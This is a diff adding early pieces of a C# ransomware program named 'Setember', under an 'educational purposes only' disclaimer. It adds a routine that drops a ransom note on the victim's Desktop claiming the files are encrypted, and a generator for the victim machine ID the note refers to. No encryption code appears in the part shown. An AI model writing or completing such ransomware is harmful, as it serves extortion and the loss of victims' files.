@@ -12,12 +12,70 @@
 // 
 // THIS SOFTWARE MUST ONLY BE USED FOR EDUCATIONAL PURPOSES!
 
+using System.Security.Cryptography;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+
 namespace Setember;
 
 class Program
 {
+    protected internal static string MachineId { get; private set; }
+
     static void Main(string[] args)
     {
 
+    }
+
+    // The path should point to the "Desktop" folder
+    // in order for the user to perceive it.
+    private static void CreateMessageFile(string filePath)
+    {
+        string[] text = {
+            "DON'T DELETE THIS FILE!",
+            @$"MachineId: {MachineId}",
+            "---------------------------------------------",
+            "Your computer was invaded by a ransomware",
+            "and all files were encrypted.",
+            "---------------------------------------------",
+            "*Note that, if you lose your machine id, you",
+            "won't be able to decrypt your files."
+        };
+        File.WriteAllLines(filePath, text);
+    }
+
+    private static void GenerateMachineId()
+    {
+        byte[] salt = GenerateRandomSalt();
+        string computerName = Environment.MachineName;
+        string currentTime = DateTime.Now.ToString();
+        string combinedInfo = computerName + currentTime;
+
+        using (SHA512 sha512 = SHA512.Create())
+        {
+            byte[] combinedBytes = Encoding.UTF8.GetBytes(combinedInfo + Convert.ToBase64String(salt));
+            byte[] hash = sha512.ComputeHash(combinedBytes);
+            var machineId = new StringBuilder();
+
+            foreach (byte b in hash)
+            {
+                // 'X4' formats to a hexadecimal number
+                machineId.Append(b.ToString("X4"));
+            }
+
+            MachineId = machineId.ToString();
+        }
+    }
+
+    private static byte[] GenerateRandomSalt()
+    {
+        byte[] salt = new byte[32];
+
+        using (var rng = RandomNumberGenerator.Create())
+        {
+            rng.GetBytes(salt);
+        }
+        return salt;
     }
 }
